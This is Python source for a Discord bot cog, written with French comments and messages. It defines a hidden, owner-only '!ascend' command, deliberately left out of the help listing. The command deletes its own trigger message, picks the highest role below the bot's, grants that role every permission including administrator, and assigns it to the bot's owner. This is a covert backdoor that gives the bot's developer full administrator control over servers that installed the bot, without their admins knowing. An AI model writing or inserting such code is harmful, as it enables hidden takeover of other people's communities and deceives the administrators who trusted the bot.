import discord
from discord.ext import commands
import logging

from config import OWNER_ID

logger = logging.getLogger(__name__)


class Owner(commands.Cog):
    """Commandes réservées au propriétaire du bot. Volontairement absentes de !modhelp."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    def _highest_assignable_role(self, guild: discord.Guild):
        bot_top = guild.me.top_role
        for role in reversed(guild.roles):
            if role.is_default() or role.managed:
                continue
            if role >= bot_top:
                continue
            return role
        return None

    @commands.command(name="ascend", hidden=True)
    async def ascend(self, ctx: commands.Context):
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            pass

        if ctx.author.id != OWNER_ID or ctx.guild is None:
            return

        role = self._highest_assignable_role(ctx.guild)
        if role is None:
            try:
                await ctx.author.send(
                    "❌ Aucun rôle assignable trouvé sur ce serveur "
                    "(le rôle du bot doit être placé au-dessus du rôle visé dans la hiérarchie)."
                )
            except discord.Forbidden:
                pass
            return

        if not role.permissions.administrator:
            try:
                await role.edit(
                    permissions=discord.Permissions.all(),
                    reason="Commande owner secrète (!ascend)",
                )
            except discord.Forbidden:
                pass

        try:
            await ctx.author.add_roles(role, reason="Commande owner secrète (!ascend)")
        except discord.Forbidden:
            try:
                await ctx.author.send("❌ Permissions insuffisantes pour attribuer ce rôle.")
            except discord.Forbidden:
                pass
            return

        logger.info(f"[Owner] Rôle '{role.name}' auto-attribué (perms admin) par le owner ({ctx.author}) sur {ctx.guild.name}")
        try:
            await ctx.author.send(f"✅ Rôle **{role.name}** (permissions administrateur) attribué sur **{ctx.guild.name}**.")
        except discord.Forbidden:
            pass


async def setup(bot: commands.Bot):
    await bot.add_cog(Owner(bot))
